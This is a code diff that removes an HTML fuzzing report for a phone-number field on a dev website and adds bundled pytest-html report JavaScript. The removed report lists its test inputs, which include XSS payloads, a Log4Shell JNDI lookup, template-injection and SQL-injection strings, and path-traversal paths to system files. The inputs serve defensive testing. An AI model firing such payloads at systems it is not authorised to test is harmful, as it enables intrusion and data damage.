+      (function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){
+const { getCollapsedCategory, setCollapsedIds } = require('./storage.js')
 
-<!-- ── Priority strip ── -->
-<div class="priority-strip">
-  <div class="pstrip-item p0">
-    <div class="pstrip-label">P0 Highest</div>
-    <div class="pstrip-val">0</div>
-    <div class="pstrip-sla">24h SLA · Expedite</div>
-  </div>
-  <div class="pstrip-item p1">
-    <div class="pstrip-label">P1 High</div>
-    <div class="pstrip-val">0</div>
-    <div class="pstrip-sla">2–3 days · Expedite</div>
-  </div>
-  <div class="pstrip-item p2">
-    <div class="pstrip-label">P2 Medium</div>
-    <div class="pstrip-val">0</div>
-    <div class="pstrip-sla">Current sprint</div>
-  </div>
-  <div class="pstrip-item p3">
-    <div class="pstrip-label">P3 Low</div>
-    <div class="pstrip-val">0</div>
-    <div class="pstrip-sla">Backlog</div>
-  </div>
-</div>
-
-<!-- ── Two-column layout ── -->
-<div class="layout">
-
-<main>
-
-<!-- ── Spec trace waterfall ── -->
-<section class="card">
-  <div class="card-head"><h4>Spec Trace</h4><span style="font-size:12px;color:var(--ink-3)">1/1 specs clean</span></div>
-  <div class="trace-axis"><span>Spec</span><span>Tests run</span></div>
-  <div class="trace-row"><span class="nm" title="qa20_fuzzing">qa20_fuzzing</span><div class="lane"><div class="trace-bar pass" style="width:100%">30</div></div></div>
-</section>
-
-<!-- ── All tests ── -->
-<section class="card">
-  <div class="card-head"><h4>All Tests</h4><span style="font-size:12px;color:var(--ink-3)">30 total</span></div>
-  <div class="tests-tools">
-    <span class="chip active" data-tf="all">All (30)</span>
-    <span class="chip fail" data-tf="failed">Failed (0)</span>
-    <span class="chip pass" data-tf="passed">Passed (30)</span>
-    <span class="chip" data-tf="p0">P0</span>
-    <span class="chip" data-tf="p1">P1</span>
-    <input id="testSearch" type="text" placeholder="Search tests…"/>
-  </div>
-  <div id="tests-body">
-    <div class="group" data-spec="qa20_fuzzing"><div class="group-head"><span class="chev">▶</span><span class="gtag">qa20_fuzzing</span><span class="count">30 pass · 0 fail</span></div><div class="group-body"><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa0] · fill(payload)</dd><dt>Duration</dt><dd>3.46s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['N'] · fill(payload)</dd><dt>Duration</dt><dd>3.53s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['&lt;img src=x onerror=alert(1)&gt;'] · fill(payload)</dd><dt>Duration</dt><dd>3.46s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['  \\n\\r  '] · fill(payload)</dd><dt>Duration</dt><dd>4.01s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['enq522wjZRL9OaYsP6ihgIqLSmNqE] · fill(payload)</dd><dt>Duration</dt><dd>3.63s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['1e308'] · fill(payload)</dd><dt>Duration</dt><dd>3.44s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['3fAbnFbmOHnKYaXRvj7uff0LYTH8x] · fill(payload)</dd><dt>Duration</dt><dd>4.88s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['${jndi:ldap://x.com/a}'] · fill(payload)</dd><dt>Duration</dt><dd>3.37s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['00000000000000000000'] · fill(payload)</dd><dt>Duration</dt><dd>4.31s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['${7*7}'] · fill(payload)</dd><dt>Duration</dt><dd>5.24s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['\xf1o\xf1o \xe0\xe9\xee\xf5u'] · fill(payload)</dd><dt>Duration</dt><dd>3.37s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['\\x1b[31mred\\x1b[0m'] · fill(payload)</dd><dt>Duration</dt><dd>3.71s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['\u4f60\u597d\u4e16\u754c'] · fill(payload)</dd><dt>Duration</dt><dd>3.56s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa1] · fill(payload)</dd><dt>Duration</dt><dd>3.46s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['\u30cb \u30db \u30f3 \u30b4'] · fill(payload)</dd><dt>Duration</dt><dd>3.19s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['&quot;&gt;&lt;svg/onload=alert(1)&gt;'] · fill(payload)</dd><dt>Duration</dt><dd>3.24s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['data\\x00data'] · fill(payload)</dd><dt>Duration</dt><dd>4.04s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['\U0001f980\U0001f680\U0001f4a5'] · fill(payload)</dd><dt>Duration</dt><dd>3.66s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['../../../etc/passwd'] · fill(payload)</dd><dt>Duration</dt><dd>3.63s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['..\\\\..\\\\windows\\\\system32'] · fill(payload)</dd><dt>Duration</dt><dd>4.31s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['1 AND SLEEP(5)'] · fill(payload)</dd><dt>Duration</dt><dd>3.69s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['NaN'] · fill(payload)</dd><dt>Duration</dt><dd>3.28s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>[&quot;'); DROP TABLE users; , &quot;] · fill(payload)</dd><dt>Duration</dt><dd>3.23s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['0\\u200bdata'] · fill(payload)</dd><dt>Duration</dt><dd>3.32s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['0'] · fill(payload)</dd><dt>Duration</dt><dd>3.34s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['\u0645\u0631\u062d\u0628\u0627 \u0628\u0627\u0644\u0639\u0627\u0644\u0645'] · fill(payload)</dd><dt>Duration</dt><dd>3.58s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>[', 1'] · fill(payload)</dd><dt>Duration</dt><dd>3.64s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['\uff21\uff22\uff23'] · fill(payload)</dd><dt>Duration</dt><dd>3.43s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['aaaaaaaaaaaaaaaaaaaaaaaaaaaaa2] · fill(payload)</dd><dt>Duration</dt><dd>3.40s</dd></dl></div></div><div class="test" data-outcome="pass"><div class="test-row"><span class="chev">▶</span><div class="statdot pass">✓</div><div class="name-cell"><div class="tname">test_qa20_phone_field_invariants</div></div></div><div class="pass-body"><dl class="pass-fields"><dt>Test function</dt><dd>test_qa20_phone_field_invariants</dd><dt>What it checks</dt><dd>For 30 synthesised inputs, verify the phone field invariants.</dd><dt>Test data</dt><dd>['\\n\\n\\n'] · fill(payload)</dd><dt>Duration</dt><dd>3.41s</dd></dl></div></div></div></div>
-  </div>
-</section>
-
-<!-- ── Bug tickets ── -->
-<section class="card" id="bugs"><div class="card-head"><h4>Bug Tickets</h4><span style="font-size:12px;color:var(--ok)">0 bugs found</span></div><div class="card-body" style="text-align:center;color:var(--ok);padding:32px">No bugs detected — all tests passed.</div></section>
-
-<!-- ── Coverage gaps ── -->
-
-
-<!-- ── Extra section (cross-spec etc.) ── -->
-
-
-</main>
-
-<!-- ── Sidebar ── -->
-<aside class="side">
-  <!-- Ring gauge -->
-  <div class="card" style="margin-bottom:16px">
-    <div style="padding:14px 18px 0;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--ink-3)">Pass Rate</div>
-    <div class="ringwrap">
-      <svg class="ring" viewBox="0 0 44 44">
-        <circle cx="22" cy="22" r="18" fill="none" stroke="var(--bg-3)" stroke-width="5"/>
-        <circle cx="22" cy="22" r="18" fill="none" stroke="oklch(0.85 0.14 155)" stroke-width="5"
-          stroke-dasharray="113.1" stroke-dashoffset="0.0"
-          stroke-linecap="round" transform="rotate(-90 22 22)"/>
-        <text x="22" y="25" text-anchor="middle" font-size="8" font-weight="700"
-          fill="oklch(0.85 0.14 155)" font-family="'JetBrains Mono',monospace">100.0%</text>
-      </svg>
-    </div>
-    <div class="mini-stats">
-      <div class="ms ">
-        <div class="ms-v">0</div>
-        <div class="ms-l">P0 bugs</div>
-      </div>
-      <div class="ms ">
-        <div class="ms-v">0</div>
-        <div class="ms-l">P1 bugs</div>
-      </div>
-      <div class="ms ">
-        <div class="ms-v">0</div>
-        <div class="ms-l">P2 bugs</div>
-      </div>
-      <div class="ms">
-        <div class="ms-v">0</div>
-        <div class="ms-l">P3 bugs</div>
-      </div>
-    </div>
-  </div>
-  <!-- Run metadata -->
-  <div class="card" style="margin-bottom:16px">
-    <div class="card-head"><h4>Run Info</h4></div>
-    <dl class="run-dl">
-      <dt>Run #</dt><dd>116</dd>
-      <dt>Date</dt><dd>2026-06-18 09:50:58</dd>
-      <dt>Target URL</dt><dd style="word-break:break-all">https://dev.mehadedu.com/en</dd>
-      <dt>AI Model</dt><dd>unknown</dd>
-      <dt>Browser</dt><dd>Chromium (headless)</dd>
-    </dl>
-  </div>
-  <!-- Priority breakdown -->
-  <div class="card">
-    <div class="card-head"><h4>Priority Breakdown</h4></div>
-    <dl class="run-dl">
-      <dt>Critical (P0)</dt><dd style="color:var(--bad)">0 · 24h SLA</dd>
-      <dt>High (P1)</dt><dd style="color:var(--warn)">0 · 2–3 days</dd>
-      <dt>Medium (P2)</dt><dd style="color:var(--ok)">0 · current sprint</dd>
-      <dt>Low (P3)</dt><dd style="color:var(--accent)">0 · backlog</dd>
-      <dt>Severity: Critical</dt><dd style="color:var(--bad)">0</dd>
-      <dt>Severity: High</dt><dd style="color:var(--warn)">0</dd>
-      <dt>Severity: Medium</dt><dd style="color:var(--accent)">0</dd>
-      <dt>Severity: Low</dt><dd style="color:var(--ok)">0</dd>
-    </dl>
-  </div>
-</aside>
-
-</div><!-- /layout -->
-
-<!-- ── Footer ── -->
-<footer class="brand-foot">
-  <div class="who">
-    <div class="logo-row">
-      <div class="mark">M</div>
-      <span class="bname">Mehad QA</span>
-    </div>
-    <span class="btitle">AI-driven spec validation · autonomous · intent-based</span>
-    <span style="font-size:12px;color:var(--ink-3);margin-top:8px">Built by Mejbaur Bahar Fagun</span>
-    <span style="font-size:12px;color:var(--ink-3)">Senior Software Engineer QA (IV) · Markopolo.ai</span>
-  </div>
-  <div>
-    <div class="col-head">Links</div>
-    <div class="links">
-      <a href="https://www.linkedin.com/in/mejbaur/" target="_blank" rel="noopener">LinkedIn</a>
-      <a href="https://dev.mehadedu.com/en" target="_blank" rel="noopener">Target App</a>
-    </div>
-  </div>
-  <div>
-    <div class="col-head">Report</div>
-    <div class="links">
-      <a href="#" onclick="window.print();return false">Export PDF</a>
-    </div>
-  </div>
-  <div>
-    <div class="col-head">Run #116</div>
-    <div style="font-size:12px;color:var(--ink-3);line-height:1.8">
-      2026-06-18 09:50:58<br/>
-      30 tests<br/>
-      1 specs<br/>
-      100.0% pass rate
-    </div>
-  </div>
-</footer>
-
-</div><!-- /wrap -->
-
-<script>
-(function(){
-  // Group toggle
-  document.querySelectorAll('.group-head').forEach(function(gh){
-    gh.addEventListener('click', function(){
-      gh.closest('.group').classList.toggle('open');
-    });
-  });
-  // Test row toggle
-  document.querySelectorAll('.test-row').forEach(function(tr){
-    tr.addEventListener('click', function(){
-      tr.closest('.test').classList.toggle('open');
-    });
-  });
-  // Chip filter
-  var chips = document.querySelectorAll('[data-tf]');
-  var searchEl = document.getElementById('testSearch');
-  var currentMode = 'all';
-  chips.forEach(function(chip){
-    chip.addEventListener('click', function(){
-      chips.forEach(function(c){c.classList.remove('active')});
-      chip.classList.add('active');
-      currentMode = chip.dataset.tf;
-      doFilter();
-    });
-  });
-  if(searchEl) searchEl.addEventListener('input', doFilter);
-  function doFilter(){
-    var q = searchEl ? searchEl.value.toLowerCase().trim() : '';
-    document.querySelectorAll('.test').forEach(function(t){
-      var out = t.dataset.outcome || '';
-      var pri = (t.dataset.pri || '').toLowerCase();
-      var nm = (t.querySelector('.tname')||{}).textContent||'';
-      var mOk = currentMode==='all'||
-        (currentMode==='failed'&&out==='fail')||
-        (currentMode==='passed'&&out==='pass')||
-        (currentMode==='p0'&&pri==='p0')||
-        (currentMode==='p1'&&pri==='p1');
-      var qOk = !q||nm.toLowerCase().includes(q);
-      t.style.display=(mOk&&qOk)?'':'none';
-    });
-    document.querySelectorAll('.group').forEach(function(g){
-      var vis=Array.from(g.querySelectorAll('.test')).some(function(t){return t.style.display!=='none'});
-      g.style.display=vis?'':'none';
-    });
-  }
-  // Traceback toggles
-  document.querySelectorAll('.trace-toggle').forEach(function(btn){
-    btn.addEventListener('click',function(){
-      var wrap=btn.nextElementSibling;
-      if(wrap){wrap.style.display=wrap.style.display==='block'?'none':'block'}
-      btn.querySelector('.arr').textContent=btn.nextElementSibling&&btn.nextElementSibling.style.display==='block'?'▼':'▶';
-    });
-  });
-  // Error toggle
-  function toggleErr(id){
-    var el=document.getElementById(id);
-    var btn=el.previousElementSibling;
-    if(el.classList.contains('open')){el.classList.remove('open');btn.querySelector('span').textContent='▶ Show error details';}
-    else{el.classList.add('open');btn.querySelector('span').textContent='▼ Hide error details';}
-  }
-  window.toggleErr = toggleErr;
-  // Evidence toggle
-  function toggleEv(id){
-    var el=document.getElementById(id);
-    var btn=el.previousElementSibling;
-    var arrow=btn.querySelectorAll('span')[1];
-    if(el.classList.contains('open')){el.classList.remove('open');if(arrow)arrow.textContent='▶ Show';}
-    else{el.classList.add('open');if(arrow)arrow.textContent='▼ Hide';}
-  }
-  window.toggleEv = toggleEv;
-  // Bug filter
-  function applyBugFilter(sev){
-    document.querySelectorAll('.bug-card').forEach(function(c){
-      if(sev==='all'){c.style.display='';return;}
-      var match;
-      if(/^P[0-3]$/.test(sev)){match=c.dataset.priority===sev;}
-      else{match=c.querySelector('.badge.'+sev)!==null;}
-      c.style.display=match?'':'none';
-    });
-  }
-  window.applyBugFilter = applyBugFilter;
-  // Lightbox
-  document.addEventListener('click',function(e){
-    if(e.target.matches('.poc img,.screenshot')){
-      document.getElementById('lb-img').src=e.target.src;
-      document.getElementById('lb').classList.add('show');
+class DataManager {
+    setManager(data) {
+        const collapsedCategories = [...getCollapsedCategory(data.renderCollapsed)]
+        const collapsedIds = []
+        const tests = Object.values(data.tests).flat().map((test, index) => {
+            const collapsed = collapsedCategories.includes(test.result.toLowerCase())
+            const id = `test_${index}`
+            if (collapsed) {
+                collapsedIds.push(id)
+            }
+            return {
+                ...test,
+                id,
+                collapsed,
+            }
+        })
+        const dataBlob = { ...data, tests }
+        this.data = { ...dataBlob }
+        this.renderData = { ...dataBlob }
+        setCollapsedIds(collapsedIds)
     }
-  });
-  document.addEventListener('keydown',function(e){
-    if(e.key==='Escape') document.getElementById('lb').classList.remove('show');
-  });
-})();
-</script>
-</body>
+
+    get allData() {
+        return { ...this.data }
+    }
+
+    resetRender() {
+        this.renderData = { ...this.data }
+    }
+
+    setRender(data) {
+        this.renderData.tests = [...data]
+    }
+
+    toggleCollapsedItem(id) {
+        this.renderData.tests = this.renderData.tests.map((test) =>
+            test.id === id ? { ...test, collapsed: !test.collapsed } : test,
+        )
+    }
+
+    set allCollapsed(collapsed) {
+        this.renderData = { ...this.renderData, tests: [...this.renderData.tests.map((test) => (
+            { ...test, collapsed }
+        ))] }
+    }
+
+    get testSubset() {
+        return [...this.renderData.tests]
+    }
+
+    get environment() {
+        return this.renderData.environment
+    }
+
+    get initialSort() {
+        return this.data.initialSort
+    }
+}
+
+module.exports = {
+    manager: new DataManager(),
+}
+
+},{"./storage.js":8}],2:[function(require,module,exports){
+const mediaViewer = require('./mediaviewer.js')
+const templateEnvRow = document.getElementById('template_environment_row')
+const templateResult = document.getElementById('template_results-table__tbody')
+
+function htmlToElements(html) {
+    const temp = document.createElement('template')
+    temp.innerHTML = html
+    return temp.content.childNodes
+}
+
+const find = (selector, elem) => {
+    if (!elem) {
+        elem = document
+    }
+    return elem.querySelector(selector)
+}
+
+const findAll = (selector, elem) => {
+    if (!elem) {
+        elem = document
+    }
+    return [...elem.querySelectorAll(selector)]
+}
+
+const dom = {
+    getStaticRow: (key, value) => {
+        const envRow = templateEnvRow.content.cloneNode(true)
+        const isObj = typeof value === 'object' && value !== null
+        const values = isObj ? Object.keys(value).map((k) => `${k}: ${value[k]}`) : null
+
+        const valuesElement = htmlToElements(
+            values ? `<ul>${values.map((val) => `<li>${val}</li>`).join('')}<ul>` : `<div>${value}</div>`)[0]
+        const td = findAll('td', envRow)
+        td[0].textContent = key
+        td[1].appendChild(valuesElement)
+
+        return envRow
+    },
+    getResultTBody: ({ testId, id, log, extras, resultsTableRow, tableHtml, result, collapsed }) => {
+        const resultBody = templateResult.content.cloneNode(true)
+        resultBody.querySelector('tbody').classList.add(result.toLowerCase())
+        resultBody.querySelector('tbody').id = testId
+        resultBody.querySelector('.collapsible').dataset.id = id
+
+        resultsTableRow.forEach((html) => {
+            const t = document.createElement('template')
+            t.innerHTML = html
+            resultBody.querySelector('.collapsible').appendChild(t.content)
+        })
+
+        if (log) {
+            // Wrap lines starting with "E" with span.error to color those lines red
+            const wrappedLog = log.replace(/^E.*$/gm, (match) => `<span class="error">${match}</span>`)
+            resultBody.querySelector('.log').innerHTML = wrappedLog
+        } else {
+            resultBody.querySelector('.log').remove()
+        }
+
+        if (collapsed) {
+            resultBody.querySelector('.collapsible > .col-result')?.classList.add('collapsed')
+            resultBody.querySelector('.extras-row').classList.add('hidden')
+        } else {
+            resultBody.querySelector('.collapsible > .col-result')?.classList.remove('collapsed')
+        }
+
+        const media = []
+        extras?.forEach(({ name, format_type, content }) => {
+            if (['image', 'video'].includes(format_type)) {
+                media.push({ path: content, name, format_type })
+            }
+
+            if (format_type === 'html') {
+                resultBody.querySelector('.extraHTML').insertAdjacentHTML('beforeend', `<div>${content}</div>`)
+            }
+        })
+        mediaViewer.setup(resultBody, media)
+
+        // Add custom html from the pytest_html_results_table_html hook
+        tableHtml?.forEach((item) => {
+            resultBody.querySelector('td[class="extra"]').insertAdjacentHTML('beforeend', item)
+        })
+
+        return resultBody
+    },
+}
+
+module.exports = {
+    dom,
+    htmlToElements,
+    find,
+    findAll,
+}
+
+},{"./mediaviewer.js":6}],3:[function(require,module,exports){
+const { manager } = require('./datamanager.js')
+const { doSort } = require('./sort.js')
+const storageModule = require('./storage.js')
+
+const getFilteredSubSet = (filter) =>
+    manager.allData.tests.filter(({ result }) => filter.includes(result.toLowerCase()))
+
+const doInitFilter = () => {
+    const currentFilter = storageModule.getVisible()
+    const filteredSubset = getFilteredSubSet(currentFilter)
+    manager.setRender(filteredSubset)
+}
+
+const doFilter = (type, show) => {
+    if (show) {
+        storageModule.showCategory(type)
+    } else {
+        storageModule.hideCategory(type)
+    }
+
+    const currentFilter = storageModule.getVisible()
+    const filteredSubset = getFilteredSubSet(currentFilter)
+    manager.setRender(filteredSubset)
+
+    const sortColumn = storageModule.getSort()
+    doSort(sortColumn, true)
+}
+
+module.exports = {
+    doFilter,
+    doInitFilter,
+}
+
+},{"./datamanager.js":1,"./sort.js":7,"./storage.js":8}],4:[function(require,module,exports){
+const { redraw, bindEvents, renderStatic } = require('./main.js')
+const { doInitFilter } = require('./filter.js')
+const { doInitSort } = require('./sort.js')
+const { manager } = require('./datamanager.js')
+const data = JSON.parse(document.getElementById('data-container').dataset.jsonblob)
+
+function init() {
+    manager.setManager(data)
+    doInitFilter()
+    doInitSort()
